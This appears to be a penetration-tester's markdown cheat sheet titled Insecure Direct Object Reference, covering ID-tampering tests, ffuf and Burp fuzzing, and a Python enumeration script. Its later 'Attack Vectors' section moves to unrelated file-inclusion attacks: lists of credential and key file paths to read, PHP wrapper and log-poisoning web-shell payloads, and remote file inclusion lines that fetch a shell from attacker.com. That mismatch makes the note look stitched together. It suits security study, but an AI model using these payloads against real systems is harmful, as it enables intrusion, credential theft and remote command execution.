---
id: IDOR
aliases: []
tags:
  - Webapp/Exploitation/Server-Side/Access-Control/IDOR
---

# Insecure Direct Object Reference

Insecure Direct Object Reference
(*[IDOR](https://en.wikipedia.org/wiki/Insecure_direct_object_reference)*)
is a web security vulnerability that occurs when an application
exposes a direct reference to an internal implementation object,
such as a database key or filename

Attackers can manipulate these references to access unauthorized data

<!-- Example {{{-->
> [!example]-
>
> IDOR vulnerabilities arise when an application
> uses user-supplied input to access objects directly
> without proper authorization checks
>
> ```sh
> http://10.10.10.245/data/12345
> ```
>
> If the application doesn't verify that the logged-in user
> owns account `12345`, an attacker could simply change the ID
>
> ```sh
> http://10.10.10.245/data/34567
> ```
<!-- }}} -->

<!-- Reference {{{-->
> [!info]-
>
> - [Hackviser](https://hackviser.com/tactics/pentesting/web/idor)
<!-- }}} -->

___

<!-- Detection {{{-->
## Detection

<!-- Manual {{{-->
### Manual

<!-- URL Parameter Tests {{{-->
#### URL Parameter Tests

Testing for IDOR in URL parameters by manipulating identifiers:

1. Identify direct object references

```sh
https://site.com/user/profile?id=123
https://site.com/api/document?doc_id=456
https://site.com/order/view?order=789
```

2. Change ID to another value

```sh
https://site.com/user/profile?id=124     # Increment by 1
https://site.com/api/document?doc_id=1   # Try minimal value
https://site.com/order/view?order=100    # Try different ranges
```

3. Observe response

- Same access level: Vulnerable to IDOR
- Different access: Check if sensitive data exposed
- Error message: Authorization might be in place
- `403`/`401`: Proper access control exists

<!-- }}} -->

<!-- POST Body Tests {{{-->
#### POST Body Tests

Testing IDOR in request bodies

Original request

```sh
POST /api/update-profile
{
  "user_id": 123,
  "email": "user@example.com"
}
```

Modified request - Try changing `user_id`

```sh
POST /api/update-profile
{
  "user_id": 124,
  "email": "attacker@example.com"
}
```

Array-based references

```sh
POST /api/delete-users
{
  "ids": [123]
}
```

Try adding other IDs

```sh
POST /api/delete-users
{
  "ids": [123, 124, 125]
}
```

<!-- }}} -->

<!-- HTTP Header Tests {{{-->
#### HTTP Header Tests

Testing for IDOR in HTTP headers

User-ID in custom headers

```sh
GET /api/profile HTTP/1.1
X-User-ID: 123
X-Account-ID: 456
```

Try modifying header values

```sh
GET /api/profile HTTP/1.1
X-User-ID: 124
X-Account-ID: 457
```

Authorization tokens with embedded IDs

```sh
Authorization: Bearer eyJ1c2VyX2lkIjoxMjN9...
```

<!-- Tip {{{-->
> [!tip]
>
> 1. Decode
> 2. Modify `user_id`
> 3. Re-encode
<!-- }}} -->

<!-- }}} -->

<!-- Cookie Tests {{{-->
#### Cookie Tests

Testing IDOR through cookie manipulation:

Original cookie

```sh
Cookie: user_id=123; session=abc123
```

Modified cookie

```sh
Cookie: user_id=124; session=abc123
```

Base64 encoded cookies

```sh
Cookie: user_data=eyJ1c2VyX2lkIjoxMjN9
```
<!-- Tip {{{-->
> [!tip]
>
> 1. Decode: `{"user_id":123}`
> 2. Modify to: `{"user_id":124}`
> 3. Encode and test
<!-- }}} -->

<!-- }}} -->

<!-- File Access Tests {{{-->
#### File Access Tests

Testing for IDOR in file operations:

Document downloads

```sh
https://site.com/download?file=document_123.pdf
https://site.com/download?file=document_124.pdf
```

Image access

```sh
https://site.com/images/user/123/avatar.jpg
https://site.com/images/user/124/avatar.jpg
```

Backup files

```sh
https://site.com/backups/user_123_backup.zip
https://site.com/backups/user_124_backup.zip
```

<!-- }}} -->

<!-- }}} -->

<!-- Automated {{{-->
### Automated

<!-- Burp Suite {{{-->
#### Burp Suite

[[Burp Suite]] — Basic IDOR fuzzing

1. Configure Burp Suite Intruder
    1. Capture request with ID parameter
    2. Send to Intruder (Ctrl+I)
    3. Mark ID parameter as payload position: §123§

2. Configure payload
    - Payload type: Numbers (sequential)
    - From: 1, To: 10000, Step: 1

3. Set matching rules
    - Grep Match: Look for sensitive keywords
    - Filter by status codes
    - Sort by response length

4. Analyze results
    - Different response sizes indicate different data
    - Same status codes might still contain different data
    - Check response times for delays

<!-- }}} -->

<!-- Ffuf {{{-->
#### Ffuf

[[Ffuf]] — Basic IDOR fuzzing

```sh
ffuf -u https://target.com/api/user/FUZZ -w numbers.txt -mc 200
```

Custom wordlist generation

```sh
seq 1 10000 > ids.txt
```

```sh
ffuf -u https://target.com/api/user/FUZZ -w ids.txt
```

With authentication

```sh
ffuf -u https://target.com/api/user/FUZZ \
  -w ids.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,301,302 \
  -fs 0
```

POST request fuzzing

```sh
ffuf -u https://target.com/api/user \
  -w ids.txt \
  -X POST \
  -d '{"user_id":"FUZZ"}' \
  -H "Content-Type: application/json"
```

<!-- }}} -->

<!-- Using Custom Scripts {{{-->
#### Using Custom Scripts

Python script for IDOR testing

<!-- Example {{{-->
> [!example]-
>
> ```py
> import requests
>
> base_url = "https://target.com/api/user/"
> headers = {"Authorization": "Bearer YOUR_TOKEN"}
> valid_responses = []
>
> for user_id in range(1, 1000):
>     url = base_url + str(user_id)
>     response = requests.get(url, headers=headers)
>
>     if response.status_code == 200:
>         # Check if response contains sensitive data
>         if "email" in response.text or "phone" in response.text:
>             valid_responses.append({
>                 "id": user_id,
>                 "status": response.status_code,
>                 "length": len(response.text),
>                 "data": response.json()
>             })
>             print(f"[+] Found: User ID {user_id}")
> ```
<!-- }}} -->

Save results

```py
with open("idor_results.json", "w") as f:
    json.dump(valid_responses, f, indent=2)
```

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Attack Vectors {{{-->
## Attack Vectors

<!-- Reading Sensitive Files {{{-->
### Reading Sensitive Files

Extracting configuration and credential files:

Linux configuration files

```sh
/etc/passwd                    # User accounts
/etc/shadow                    # Password hashes
/etc/group                     # User groups
/etc/hosts                     # DNS mappings
/etc/resolv.conf               # DNS configuration
/etc/ssh/sshd_config          # SSH configuration
/etc/mysql/my.cnf             # MySQL configuration
/etc/apache2/apache2.conf     # Apache config
/etc/nginx/nginx.conf         # Nginx config
```

Application files

```sh
/var/www/html/config.php      # PHP config
/var/www/html/.env            # Environment variables
/var/www/html/wp-config.php   # WordPress config
/var/www/html/.git/config     # Git configuration
/home/user/.ssh/id_rsa        # SSH private key
/home/user/.bash_history      # Command history
/root/.aws/credentials        # AWS credentials
/root/.docker/config.json     # Docker credentials
```

Windows files

```sh
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\xampp\apache\conf\httpd.conf
C:\wamp\apache\conf\httpd.conf
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

<!-- }}} -->

<!-- Proc Filesystem Exploitation {{{-->
### Proc Filesystem Exploitation

Linux /proc filesystem enumeration:

Process information

```sh
/proc/self/environ            # Environment variables
/proc/self/cmdline            # Command line of current process
/proc/self/stat               # Process statistics
/proc/self/status             # Process status
/proc/self/fd/[0-9]*          # File descriptors
/proc/self/cwd                # Current working directory
/proc/self/exe                # Executed binary
```

System information

```sh
/proc/version                 # Kernel version
/proc/cpuinfo                 # CPU information
/proc/meminfo                 # Memory information
/proc/devices                 # Device drivers
/proc/net/tcp                 # TCP connections
/proc/net/udp                 # UDP connections
/proc/net/arp                 # ARP table
/proc/net/fib_trie            # Routing table
```

Other processes (*if readable*)

```sh
/proc/[PID]/cmdline          # Other process command line
/proc/[PID]/environ          # Other process environment
/proc/[PID]/fd/[0-9]*        # Other process file descriptors
```

<!-- }}} -->

<!-- PHP Wrapper Exploitation {{{-->
### PHP Wrapper Exploitation

Advanced PHP wrapper techniques

`php://filter` with encoding chains

```sh
page=php://filter/convert.base64-encode/resource=config.php
page=php://filter/read=string.rot13/resource=config.php
page=php://filter/convert.iconv.utf-8.utf-16/resource=config.php
```

Chaining filters

```sh
page=php://filter/convert.base64-decode/convert.base64-encode/resource=config.php
page=php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

`php://input` for POST data execution

```sh
POST /index.php?page=php://input HTTP/1.1
<?php system($_GET['cmd']); ?>
```

`data://` wrapper

```sh
page=data://text/plain,<?php system($_GET['cmd']); ?>
page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

`zip://` wrapper

```sh
# Create malicious.zip containing shell.php
page=zip://uploads/malicious.zip%23shell.php
```

`phar://` wrapper

```sh
page=phar://uploads/file.jpg/shell.php
```

<!-- }}} -->

<!-- Log Poisoning {{{-->
### Log Poisoning

Poisoning various log files

Apache/Nginx Access Log

1. Inject PHP into User-Agent

```sh
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```

2. Include access log

```sh
page=../../../var/log/apache2/access.log&cmd=whoami
```

SSH Log Poisoning

1. Inject PHP via SSH username

```sh
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

2. Include auth log

```sh
page=../../../var/log/auth.log&cmd=whoami
```

Mail Log Poisoning

1. Send email with PHP payload

```sh
telnet target.com 25
```

```sh
MAIL FROM:<?php system($_GET["cmd"]); ?>@attacker.com
```

2. Include mail log

```sh
page=../../../var/log/mail.log&cmd=whoami
```

FTP Log Poisoning

1. Login with PHP in username

```sh
ftp> USER <?php system($_GET["cmd"]); ?>
```

2. Include FTP log

```sh
page=../../../var/log/vsftpd.log&cmd=whoami
```

<!-- }}} -->

<!-- Session File Inclusion {{{-->
### Session File Inclusion

Including PHP session files

PHP session files location

```sh
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
```

1. Set session variable with PHP code

```sh
https://target.com/index.php?session_var=<?php system($_GET['cmd']); ?>
```

2. Include session file

```sh
page=/var/lib/php/sessions/sess_abc123&cmd=whoami
```

Alternative: Use session upload progress
This works even without active session

1. Upload file with PHP in progress name

```sh
<form action="https://target.com/" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system($_GET['cmd']); ?>" />
<input type="file" name="file" />
<input type="submit" />
</form>
```

2. Include session file while uploading

```sh
page=/tmp/sess_[PHPSESSID]&cmd=whoami
```

<!-- }}} -->

<!-- Remote File Inclusion {{{-->
### Remote File Inclusion

Executing remote files

Basic RFI

```sh
page=http://attacker.com/shell.txt
```

```sh
# Shell.txt content:
<?php system($_GET['cmd']); ?>
```

Protocol variations

```sh
page=http://attacker.com/shell.txt
page=https://attacker.com/shell.txt
page=ftp://attacker.com/shell.txt
```

Bypass with double slash

```sh
page=//attacker.com/shell.txt
```

Using allowed domains (*if whitelist exists*)

Host file on allowed domain or subdomain

```sh
page=http://allowed-domain.com/path/to/shell.txt
page=http://sub.target.com/uploads/shell.txt
```

Using URL shorteners

```sh
page=http://bit.ly/malicious-shell
```

Using cloud storage

```sh
page=https://raw.githubusercontent.com/attacker/repo/shell.txt
page=https://gist.githubusercontent.com/attacker/id/raw/shell.txt
page=https://pastebin.com/raw/id
```

<!-- }}} -->

___
<!-- }}} -->
